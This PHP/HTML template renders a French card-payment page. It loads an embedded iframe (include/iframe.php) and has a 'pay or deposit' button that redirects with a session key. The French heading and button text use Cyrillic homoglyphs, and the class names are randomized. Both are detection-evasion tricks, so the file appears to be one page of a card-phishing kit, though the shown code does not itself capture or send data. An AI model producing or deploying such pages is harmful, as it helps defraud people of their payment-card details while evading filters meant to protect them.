<?php
?>

<main class="container-2q8">

<h1>Рrосédеr аu раіеmеnt раr саrtе</h1>
<!-- Parent page styling -->
<style>
    .seamless-iframe {
        border: none;
        width: 100%;
        height: 60vh;
        margin: 0;
        padding: 0;
        display: block;
    }

    .iframe-container {
        position: relative;
        width: 100%;
    }

    .button-container {
        position: relative;
        width: 100%;
        max-width: 600px;
        text-align: center;
        margin: auto;
        padding-bottom: 120px;
        padding-top: 60px;
    }

    @media screen and (max-width: 480px) {
        .iframe-container {
            width: 100%;
            max-width: 500px;
            height: 100%;
            transform-origin: top left;
            overflow: visible; /* Changed from hidden to visible */
        }

        .seamless-iframe {
            border: none;
            width: 1000px;
            height: 600px;
            transform: scale(0.4);
            transform-origin: top left;
        }

        .button-container {
            position: relative;
            margin-top: -300px; /* Use negative margin instead of absolute positioning */
            width: 100%;
            text-align: center;
            z-index: 1000;
            margin-bottom: 0;
            padding-top: 0;
            padding-bottom: 50px;
        }

        .btn-r1e {
            display: inline-block;
            padding: 10px 20px;
            font-size: 16px;
            z-index: 1000;
            position: relative;
            /* Add your other button styles here */
        }
    }
</style>

<div class="iframe-container">
    <iframe 
        src="<?php echo APP_PATH . 'include/iframe.php'; ?>" 
        class="seamless-iframe"
        frameborder="0" 
        scrolling="no"
    ></iframe>
</div>

<div class="button-container">
    <div class="form-f58">
        <form class="form-b69" novalidate="novalidate">
            <button type="submit" class="btn-r1e">Раyеr оu соnsіgnеr</button>
        </form>
    </div>
</div>
</main>
</div>

<script>
    $('.form-b69').submit(function(event) {
        event.preventDefault();
        var op = "<?php $_SESSION['op'] = "payment"; echo $_SESSION['op']; ?>";
        top.location.href = '<?php echo './'. APP_PATH . '/'. APP. "?session_key=".$_SESSION['sessionKey']."&op=".$_SESSION['op']; ?>';
    });
</script>